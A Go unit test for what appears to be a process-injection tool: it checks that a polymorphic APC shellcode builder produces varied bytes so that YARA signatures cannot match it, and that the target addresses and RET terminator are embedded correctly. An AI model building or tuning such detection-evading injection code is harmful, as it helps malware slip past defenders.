package presenter

import (
	"bytes"
	"encoding/binary"
	"testing"
)

// TestShellcodePolymorphism verifies that buildPolymorphicAPCShellcode
// produces a different byte sequence across multiple invocations. If the
// output were static, YARA could signature it with a single rule.
func TestShellcodePolymorphism(t *testing.T) {
	const remoteBuf uintptr = 0x7FF700001000
	const initAddr uintptr = 0x7FF700009ABC

	samples := make([][]byte, 8)
	for i := range samples {
		samples[i] = buildPolymorphicAPCShellcode(remoteBuf, initAddr)
	}

	// Ensure at least 3 distinct byte sequences out of 8 samples —
	// probability of <3 unique given 4+ variants is astronomically low.
	distinct := map[string]bool{}
	for _, s := range samples {
		distinct[string(s)] = true
	}
	if len(distinct) < 3 {
		t.Fatalf("expected ≥3 distinct shellcode variants in 8 samples, got %d", len(distinct))
	}

	// Ensure the remoteBuf and initAddr IMM64s are always embedded exactly
	// once (not two copies, not zero). This catches silent builder regressions.
	var rbBuf [8]byte
	var iaBuf [8]byte
	binary.LittleEndian.PutUint64(rbBuf[:], uint64(remoteBuf))
	binary.LittleEndian.PutUint64(iaBuf[:], uint64(initAddr))
	for i, s := range samples {
		if c := bytes.Count(s, rbBuf[:]); c != 1 {
			t.Errorf("sample %d: expected 1 copy of remoteBuf, got %d", i, c)
		}
		if c := bytes.Count(s, iaBuf[:]); c != 1 {
			t.Errorf("sample %d: expected 1 copy of initAddr, got %d", i, c)
		}
		if s[len(s)-1] != 0xC3 {
			t.Errorf("sample %d: expected RET (0xC3) terminator, got 0x%02x", i, s[len(s)-1])
		}
	}

	t.Logf("produced %d distinct shellcode variants across 8 samples; sizes: ", len(distinct))
	for i, s := range samples {
		t.Logf("  [%d] len=%d head=%x", i, len(s), s[:min(8, len(s))])
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
